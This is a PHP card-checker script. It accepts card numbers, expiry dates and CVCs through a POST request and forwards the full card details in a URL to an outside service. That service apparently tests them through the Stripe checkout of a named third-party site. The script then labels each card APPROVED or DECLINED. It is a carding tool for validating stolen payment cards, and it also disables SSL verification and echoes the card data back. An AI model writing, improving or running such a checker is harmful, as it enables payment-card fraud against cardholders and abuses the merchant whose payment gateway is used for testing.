<?php
header('Content-Type: text/plain');

// Enable error reporting for debugging (remove in production)
ini_set('display_errors', 0);
error_reporting(E_ALL);

// Function to check a single card via API
function checkCard($card_number, $exp_month, $exp_year, $cvc) {
    // Normalize exp_year to 4 digits if needed (handled before call)
    // API endpoint configuration
    $cc = "$card_number|$exp_month|$exp_year|$cvc";
    $encoded_cc = urlencode($cc);
    $api_url = "https://rockyysoon.onrender.com/gateway=autostripe/key=rockysoon?site=shebrews.org&{$encoded_cc}";

    // Initialize cURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Disable SSL verification if needed (insecure; use with caution)

    // Execute request
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curl_error = curl_error($ch);
    curl_close($ch);

    // Prepare card details string (using input values)
    $card_details = "$card_number|$exp_month|$exp_year|$cvc";

    // Handle API errors
    if ($response === false || $http_code !== 200 || !empty($curl_error)) {
        return "DECLINED [API request failed: $curl_error (HTTP $http_code)] $card_details";
    }

    // Parse JSON response
    $result = json_decode($response, true);
    if (json_last_error() !== JSON_ERROR_NONE || !isset($result['status'], $result['response'])) {
        return "DECLINED [Invalid API response: " . substr($response, 0, 100) . "] $card_details";
    }

    $status = strtoupper($result['status']);
    $response_msg = $result['response'];

    // Output based on status
    if ($status === "APPROVED") {
        return "APPROVED [$response_msg] $card_details";
    } elseif ($status === "DECLINED") {
        return "DECLINED [$response_msg] $card_details";
    } else {
        return "DECLINED [Unknown status: $status] $card_details";
    }
}

// Check if the request is POST and contains card data
if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['card'])) {
    echo "DECLINED [Invalid request or missing card data]";
    exit;
}

$card = $_POST['card'];
$required_fields = ['number', 'exp_month', 'exp_year', 'cvc'];

// Validate card data
foreach ($required_fields as $field) {
    if (empty($card[$field])) {
        echo "DECLINED [Missing $field]";
        exit;
    }
}

// Sanitize inputs
$card_number = preg_replace('/[^0-9]/', '', $card['number']);
$exp_month_raw = preg_replace('/[^0-9]/', '', $card['exp_month']);
$exp_year_raw = preg_replace('/[^0-9]/', '', $card['exp_year']);
$cvc = preg_replace('/[^0-9]/', '', $card['cvc']);

// Normalize exp_month to 2 digits
$exp_month = str_pad($exp_month_raw, 2, '0', STR_PAD_LEFT);
if (strlen($exp_month) > 2) {
    echo "DECLINED [Invalid exp_month format]";
    exit;
}

// Normalize exp_year to 4 digits
if (strlen($exp_year_raw) == 2) {
    $current_year = date('y'); // Last two digits of current year (25 for 2025)
    $current_century = date('Y') - ($current_year); // 2000 for 2025
    $card_century = (int)$exp_year_raw >= (int)$current_year ? $current_century : $current_century + 100;
    $exp_year = $card_century + (int)$exp_year_raw;
} elseif (strlen($exp_year_raw) == 4) {
    $exp_year = $exp_year_raw;
} else {
    echo "DECLINED [Invalid exp_year format - must be YY or YYYY]";
    exit;
}

// Basic validation
if (!preg_match('/^\d{13,19}$/', $card_number) ||
    !preg_match('/^\d{2}$/', $exp_month) ||
    !preg_match('/^\d{4}$/', $exp_year) ||
    !preg_match('/^\d{3,4}$/', $cvc)) {
    echo "DECLINED [Invalid card format]";
    exit;
}

// Validate logical expiry
$expiry_timestamp = strtotime("$exp_year-$exp_month-01");
if ($expiry_timestamp < strtotime('first day of this month')) {
    echo "DECLINED [Card expired] $card_number|$exp_month|$exp_year|$cvc";
    exit;
}

// Check single card
echo checkCard($card_number, $exp_month, $exp_year, $cvc);
